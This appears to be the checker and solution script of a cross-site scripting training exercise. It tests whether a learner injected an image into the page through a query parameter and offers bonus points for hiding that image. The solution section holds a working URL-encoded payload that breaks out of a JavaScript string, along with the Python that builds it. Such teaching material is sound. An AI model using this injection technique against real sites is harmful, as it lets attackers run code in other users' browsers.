function find_hack_image() {
    for (var x=0; x<document.images.length; x++) {
        if (document.images[x].src == 'http://test/image.jpg')
            return document.images[x];
    }
    return null;
}

var result = '';
var img = find_hack_image();

if (img && img.style.display == 'none') {
    result = '<div class="answer panel"><p><strong>Sweeeeeet!</strong> You get bonus points, brown noser.</p></div>';
} else if (img) {
    result = '<div class="answer panel"><p><strong>Success!</strong> You have added your own ' +
        'img to my page. For bonus points you should try to hide ' +
        'it from the user.</p></div>';
} else if (myvar != 'awesome') {
    $('.hints').removeClass('hidden');
}

document.getElementById("result").innerHTML = result;

var solutionHTML = FSTR(function(){/*
<h4>Solution</h4>
<p>The link below has the correct URL:</p>
<a href="/cross-site-scripting/query-params?qs=%22%3Bvar%20i%3Ddocument.createElement%28%27img%27%29%3Bi.src%3D%27http%3A//test/image.jpg%27%3Bdocument.body.appendChild%28i%29%3B%22">solution link</a>
<p>This querystring was created using interactive Python:</p>
<code>
    from urllib.parse import quote<br>
    s = '''";var i=document.createElement('img');''' +\<br>
    &nbsp;&nbsp;&nbsp;&nbsp;'''i.src='http://test/image.jpg';''' +\<br>
    &nbsp;&nbsp;&nbsp;&nbsp;'''i.setAttribute('display', 'none');''' +\<br>
    &nbsp;&nbsp;&nbsp;&nbsp;'''document.body.appendChild(i);"'''<br>
    quote(s)
</code>

<p>For Python 2, change the first line to read: <code>from urllib import quote</code>.</p>
*/});
